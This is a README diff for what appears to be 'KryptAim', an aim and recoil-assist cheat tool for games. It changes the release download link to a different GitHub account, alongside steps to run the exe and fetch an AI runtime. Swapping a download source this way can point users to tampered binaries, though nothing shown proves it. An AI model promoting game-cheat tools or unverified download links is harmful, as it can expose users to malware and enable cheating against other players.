@@ -36,7 +36,7 @@ flowchart LR
   G --> H[Start AI engine]
 ```
 
-1. Download `KryptAim.zip` from [Releases](https://github.com/AimSyncCore/KryptAim/releases) and extract `KryptAim.exe` anywhere.
+1. Download `KryptAim.zip` from [Releases](https://github.com/Kava4/KryptAim/releases) and extract `KryptAim.exe` anywhere.
 2. Run it — recoil and dashboard work immediately.
 3. Open **Global Settings** → **AI Runtime** → click **Install AI runtime**.
 4. Wait 10–20 minutes (internet required). Checklist turns green when each step completes. Downloads:
